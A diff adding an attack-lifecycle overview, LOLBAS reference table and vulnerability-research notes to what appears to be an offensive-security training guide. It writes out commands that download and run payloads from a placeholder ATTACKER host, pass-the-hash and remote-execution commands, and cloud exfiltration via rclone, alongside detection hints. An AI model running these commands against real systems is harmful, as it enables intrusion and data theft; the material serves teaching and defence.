@@ -151,3 +151,86 @@ The fastest legal path into offensive security is through structured lab environ
 - [ADSecurity.org](https://adsecurity.org) — Sean Metcalf's authoritative Active Directory security and attack reference; the most complete public documentation of AD offensive techniques
 - [WADComs Interactive Cheatsheet](https://wadcoms.github.io) — Interactive Active Directory attack reference filtered by OS, tool, and technique; practical field reference during AD engagements
 - [Exploit Database](https://www.exploit-db.com) — Offensive Security's public exploit database; public exploits and PoC code indexed by CVE and platform
+---
+
+## Attack Lifecycle Overview
+
+The full offensive lifecycle maps to MITRE ATT&CK phases. Understanding each phase -- and the real tools used at each -- is essential for both operators and defenders.
+
+#### Reconnaissance (TA0043)
+
+- Passive: Shodan, Censys, SecurityTrails, WHOIS, LinkedIn for employee enumeration
+- Active: nmap, Masscan, Nessus unauthenticated, Nuclei discovery templates
+- OSINT automation: SpiderFoot, recon-ng, theHarvester
+
+#### Resource Development (TA0042)
+
+- Infrastructure: VPS (Vultr/Hetzner/DigitalOcean), domain purchase, SSL cert (Let's Encrypt)
+- Categorize domain (Cisco Talos reputation check, MXToolbox, URLVoid) before use
+- C2 setup: Sliver server on VPS, Apache redirector in front, domain fronting via Cloudflare
+
+#### Initial Access (TA0001)
+
+- Phishing: GoPhish + Evilginx3 for AiTM (Adversary-in-the-Middle) phishing with MFA capture
+- Credential stuffing: Nuclei credential-stuffing templates, Hydra
+- Exposed services: Check Shodan for exposed RDP, VPN login pages, Citrix/Exchange
+- Supply chain: Malicious dependency injection, typosquatting (npm/pip/RubyGems)
+
+#### Execution (TA0002)
+
+- Living off the land: PowerShell, WMI, MSHTA, Regsvr32, Certutil, BITSAdmin (LOLBAS)
+- Scripting: PowerShell one-liners, VBScript, JScript, HTA files
+
+#### Persistence (TA0003)
+
+- Registry run keys, scheduled tasks, services, WMI subscriptions
+- COM object hijacking, DLL search order hijacking, BITS jobs
+- Boot/logon autostart: Startup folder, LSA providers, Security Support Providers
+
+#### Privilege Escalation (TA0004)
+
+- Windows: AlwaysInstallElevated, unquoted service paths, SeImpersonatePrivilege (Potato exploits), token impersonation
+- Linux: SUID/SGID binaries, sudo misconfiguration, cron jobs with writable scripts, PATH injection
+- Tools: WinPEAS, LinPEAS, PowerUp, PEASS-ng suite
+
+#### Lateral Movement (TA0008)
+
+- WMI: `wmic /node:TARGET process call create "cmd.exe /c whoami"`
+- SMB/PsExec: `psexec.py domain/user:pass@TARGET`
+- Pass-the-Hash: `crackmapexec smb TARGET -u admin -H NTLM_HASH`
+- RDP: `xfreerdp /u:user /p:pass /v:TARGET /cert-ignore`
+- WinRM: `evil-winrm -i TARGET -u user -p pass`
+
+#### Collection and Exfiltration (TA0009/TA0010)
+
+- Directory listing + file search: `findstr /si password *.txt *.ini *.config`
+- Cloud storage exfil: `rclone copy /data gdrive:exfil/`
+- DNS exfiltration (stealthy): dnscat2, custom base32 subdomain encoding
+- HTTPS: POST to attacker-controlled server over legitimate-looking HTTPS
+
+---
+
+## LOLBAS Reference (Living Off the Land Binaries and Scripts)
+
+Windows-native binaries that can be abused offensively. Essential for EDR evasion without custom tooling.
+
+| Binary | Use Case | ATT&CK | Detection |
+|---|---|---|---|
+| certutil.exe | Download files: `certutil -urlcache -split -f http://ATTACKER/payload.exe C:\out.exe` | T1105 | Alert on certutil with URL parameters |
+| mshta.exe | Execute HTA: `mshta http://ATTACKER/evil.hta` | T1218.005 | mshta.exe making network connections |
+| regsvr32.exe | Execute DLL/SCT: `regsvr32 /s /n /u /i:http://ATTACKER/evil.sct scrobj.dll` | T1218.010 | regsvr32 with /i: parameter |
+| rundll32.exe | Execute DLL: `rundll32.exe evil.dll,EntryPoint` | T1218.011 | rundll32 with unusual DLL paths |
+| wmic.exe | Lateral movement, process creation | T1047 | wmic with /node: or process call create |
+| bitsadmin.exe | Download: `bitsadmin /transfer job http://ATTACKER/payload.exe C:\out.exe` | T1197 | bitsadmin /transfer to external URL |
+| powershell.exe | Everything | T1059.001 | Encoded commands (-EncodedCommand), AMSI bypass attempts |
+| wscript.exe | Execute VBScript | T1059.005 | wscript with .vbs from temp/download dirs |
+| msiexec.exe | Execute MSI: `msiexec /q /i http://ATTACKER/evil.msi` | T1218.007 | msiexec fetching from URL |
+
+---
+
+## Vulnerability Research Process
+
+- CVE monitoring: NVD, CISA KEV, Vulncheck, Packet Storm, ExploitDB
+- PoC development workflow: Reproduce locally in lab → understand root cause → weaponize
+- Bug bounty programs: HackerOne, Bugcrowd, Intigriti -- scoped responsible disclosure
+- Resources: LiveOverflow YouTube, pwn.college, exploit.education VMs
